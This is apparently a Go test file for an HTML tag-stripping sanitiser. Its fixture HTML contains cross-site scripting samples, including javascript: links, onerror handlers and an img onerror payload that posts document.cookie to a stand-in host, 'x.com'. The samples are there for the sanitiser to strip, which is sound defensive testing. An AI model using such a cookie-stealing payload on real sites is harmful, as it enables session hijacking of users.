package striptags

import (
	"fmt"
	"testing"
)

var html_str string = `<!doctype html>
	   <html>
	       <body>
	       		<hx name="zhang">not test</hx>
	       		<!-- fuck comment-->
	       		<script>
	       			alert(2)
	       		</script>
	       		<index id="2" />
	       		<pre class="prettyprint">
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;meta charset="UTF-8"&gt;
	&lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;a href="   javascript:alert(2)"&gt;click me&lt;/a&gt;
	&lt;img src="" alt="" onerror="javascript:alert(3)"&gt;
&lt;/body&gt;
&lt;/html&gt;
	       		</pre>
	       		<div id="content">
	       			this is content div
	           		<a title="baidu-title" href="baidu.com" attr-test="fuck">baidu</a>
	           		<a href="javascript:void(0)" title="js link" attr-test="fuck">js</a>
	           		<img src="hello" />
	           		<img src="world" />
	           		<img src="worldx" onerror="$.post('x.com',{"c":document.cookie})" />
	           		<div id="right" class="wight">
	           			this is right wight
	           		</div>
	           	</div>
	       </body>
	   </html>`

func TestDefaultStripTags(t *testing.T) {
	strip_tags := NewStripTags()
	html_clean, _ := strip_tags.Fetch(html_str)
	fmt.Println(html_clean)
}

func TestEscapeNotValid(t *testing.T) {
	strip_tags := NewStripTags()
	strip_tags.EscapeNotValid = true
	html_clean, _ := strip_tags.Fetch(html_str)
	fmt.Println(html_clean)
}

func TestTrimSpace(t *testing.T) {
	strip_tags := NewStripTags()
	// strip_tags.EscapeNotValid = true
	strip_tags.TrimSpace = true
	html_clean, _ := strip_tags.Fetch(html_str)
	fmt.Println(html_clean)
}

func TestValidTags(t *testing.T) {
	html_str = `
	<p> hello world </p>
	<a title="google" href="http://www.google.com">google search</a>
	<ul>
		<li>apple</li>
		<li>htc</li>
		<li>meizu</li>
		<li>sony</li>
	</ul>
	`
	strip_tags := NewStripTags()
	strip_tags.EscapeNotValid = true
	// strip_tags.TrimSpace = true
	strip_tags.ValidTags = map[string]interface{}{
		"p":  true,
		"li": true,
		"ul": true,
	}

	html_clean, err := strip_tags.Fetch(html_str)
	fmt.Println(html_clean)
	if err != nil {
		t.Error(err)
	}
}

func TestValidAttrs(t *testing.T) {
	html_str = `
	<p> hello world </p>
	<a title="google" href="http://www.google.com" onclick="send(this);">google search</a>
	<ul source="mobile">
		<li>apple</li>
		<li active="active">htc</li>
		<li>meizu</li>
		<li>sony</li>
	</ul>
	`
	strip_tags := NewStripTags()
	strip_tags.EscapeNotValid = true
	// strip_tags.TrimSpace = true
	strip_tags.ValidTags = map[string]interface{}{
		"p":  true,
		"li": false,
		"ul": true,
		"a":  map[string]interface{}{"href": true},
	}

	html_clean, err := strip_tags.Fetch(html_str)
	fmt.Println(html_clean)
	if err != nil {
		t.Error(err)
	}
}
